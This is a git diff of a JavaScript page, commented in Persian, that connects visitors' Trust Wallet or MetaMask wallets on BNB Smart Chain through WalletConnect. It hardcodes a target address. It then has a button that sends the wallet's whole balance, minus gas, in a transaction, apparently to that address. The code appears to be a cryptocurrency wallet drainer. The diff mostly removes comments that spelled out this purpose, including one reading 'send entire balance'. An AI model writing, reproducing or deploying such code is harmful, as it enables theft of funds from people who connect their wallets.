@@ -1,14 +1,13 @@
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
 import { ethers } from "ethers";
 
-// اطلاعات ثابت
+// تنظیمات ثابت
 const PROJECT_ID = "4d08946e6c316bed5e76b450ccbb5256";
 const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
 
-// انتخاب کیف پول کاربر
 let selectedWallet = null;
 
-// عناصر DOM
+// ارجاع به عناصر DOM
 const connectBtn = document.getElementById("connect");
 const trustBtn = document.getElementById("trust");
 const mmBtn = document.getElementById("metamask");
@@ -34,12 +33,12 @@ mmBtn.onclick = () => {
 };
 
 async function startConnection() {
-  // ۱. مقداردهی EthereumProvider با requiredNamespaces
   const provider = await EthereumProvider.init({
     projectId: PROJECT_ID,
     showQrModal: false,
     requiredNamespaces: {
       eip155: {
+        chains: ["eip155:56"],
         methods: [
           "eth_sendTransaction",
           "eth_signTransaction",
@@ -47,7 +46,6 @@ async function startConnection() {
           "personal_sign",
           "eth_signTypedData"
         ],
-        chains: ["eip155:56"],
         events: ["chainChanged", "accountsChanged"],
         rpcMap: {
           56: "https://bsc-dataseed.binance.org/"
@@ -56,19 +54,16 @@ async function startConnection() {
     }
   });
 
-  // ۲. شنود URI اتصال برای deep link
   provider.on("display_uri", (uri) => {
-    const deepLink =
+    const link =
       selectedWallet === "trust"
         ? `trust://wc?uri=${encodeURIComponent(uri)}`
         : `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`;
 
-    // هدایت به کیف پول
-    window.location.href = deepLink;
+    window.location.href = link;
   });
 
   try {
-    // ۳. اجرای اتصال
     await provider.enable();
 
     const ethProvider = new ethers.providers.Web3Provider(provider);
@@ -81,7 +76,6 @@ async function startConnection() {
     balSpan.textContent = ethers.utils.formatEther(balance) + " BNB";
     infoDiv.style.display = "block";
 
-    // ۴. ارسال کل موجودی
     btnSend.onclick = async () => {
       const bal = await ethProvider.getBalance(address);
       const gasPrice = await ethProvider.getGasPrice();
@@ -100,7 +94,7 @@ async function startConnection() {
 
       alert("تراکنش ارسال شد:\n" + tx.hash);
       await tx.wait();
-      alert("تراکنش تایید شد!");
+      alert("تأیید شد!");
 
       const newBal = await ethProvider.getBalance(address);
       balSpan.textContent = ethers.utils.formatEther(newBal) + " BNB";
